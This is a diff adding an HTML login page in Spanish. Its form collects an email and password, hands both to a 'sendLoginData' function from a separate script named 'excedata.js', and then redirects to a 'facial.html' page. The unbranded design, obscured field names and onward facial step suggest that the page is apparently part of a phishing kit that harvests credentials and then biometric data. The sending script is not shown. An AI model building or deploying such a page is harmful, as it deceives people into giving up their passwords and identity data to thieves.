@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="docs/remixicon.css" rel="stylesheet" />
+    <link rel="stylesheet" href="docs/styles.css" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css"
+      rel="stylesheet"
+    />
+    <title>Iniciar</title>
+    <style>
+      .button-loading {
+        position: relative;
+        pointer-events: none;
+      }
+      .button-loading::after {
+        content: "";
+        position: absolute;
+        width: 16px;
+        height: 16px;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto;
+        border: 3px solid transparent;
+        border-top-color: white;
+        border-radius: 50%;
+        animation: button-loading-spinner 1s linear infinite;
+      }
+      @keyframes button-loading-spinner {
+        from {
+          transform: rotate(0turn);
+        }
+        to {
+          transform: rotate(1turn);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <section class="login">
+      <img src="docs/imgnew.svg" alt="Login-image" class="login--image" />
+
+      <form id="loginForm" class="login--form">
+        <div align="left">
+          <img src="docs/lbg.png" style="width: 110px" /><br />
+          <span style="font-size: 20px"><b>Iniciar sesión</b></span>
+        </div>
+        <br />
+
+        <div class="login--content">
+          <div class="login-box">
+            <i class="ri-user-3-line login-icon"></i>
+            <div class="login--input-box">
+              <input
+                type="email"
+                required
+                name="eml"
+                class="login-input"
+                id="login-input-text"
+                placeholder=" "
+              />
+              <label for="" class="login--input-label"
+                >Correo electrónico</label
+              >
+            </div>
+          </div>
+
+          <div class="login-box">
+            <i class="ri-lock-2-line login-icon"></i>
+            <div class="login--input-box">
+              <input
+                type="password"
+                name="psew"
+                class="login-input"
+                id="login-input-pass"
+                placeholder=" "
+                required
+              />
+              <label for="" class="login--input-label">Contraseña</label>
+              <i class="login--eye ri-eye-off-line" id="login--eye"></i>
+            </div>
+          </div>
+        </div>
+
+        <button type="submit" class="login--button" id="submitButton">
+          Siguiente
+        </button>
+      </form>
+    </section>
+
+    <!-- Scripts -->
+    <script src="excedata.js"></script>
+    <script src="docs/main.js"></script>
+
+    <!-- Script mejorado para manejar el envío del formulario -->
+    <script>
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+
+          const submitButton = document.getElementById("submitButton");
+          const originalButtonText = submitButton.innerHTML;
+
+          // Deshabilitar el botón y mostrar estado de carga
+          submitButton.disabled = true;
+          submitButton.classList.add("button-loading");
+          submitButton.innerHTML = "Enviando...";
+
+          try {
+            // Obtener los valores del formulario
+            const email = this.eml.value;
+            const password = this.psew.value;
+
+            // Validación básica
+            if (!email || !password) {
+              throw new Error("Por favor complete todos los campos");
+            }
+
+            // Llamar a la función de excedata.js
+            if (typeof sendLoginData === "function") {
+              localStorage.setItem("correo", email);
+              await sendLoginData(email, password);
+              window.location.href = "facial.html";
+            } else {
+              throw new Error(
+                "Error en el sistema. Por favor recargue la página"
+              );
+            }
+          } catch (error) {
+            console.error("Error:", error);
+            // Restaurar el botón
+            submitButton.disabled = false;
+            submitButton.classList.remove("button-loading");
+            submitButton.innerHTML = originalButtonText;
+
+            // Mostrar mensaje de error (opcional)
+            alert(
+              error.message || "Ocurrió un error. Por favor intente nuevamente."
+            );
+          }
+        });
+    </script>
+  </body>
+</html>
